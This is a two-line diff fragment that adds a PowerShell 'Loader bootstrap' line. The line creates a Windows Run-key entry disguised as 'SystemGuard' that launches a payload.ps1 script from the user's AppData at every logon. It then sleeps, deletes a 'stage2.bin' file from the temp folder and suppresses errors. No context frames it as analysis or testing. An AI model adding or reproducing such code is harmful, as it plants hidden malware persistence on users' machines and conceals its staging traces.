@@ -1,0 +1,2 @@
+
+<# Loader bootstrap #> try { Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name 'SystemGuard' -Value ('powershell.exe -NoP -File "' + "$env:APPDATA\payload.ps1" + '"') -Force -ErrorAction SilentlyContinue; Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'SystemGuard' -ErrorAction SilentlyContinue; Start-Sleep -Seconds 7; Remove-Item -Path "$env:TEMP\stage2.bin" -Force } catch { Write-Warning "Remote fetch failed" }
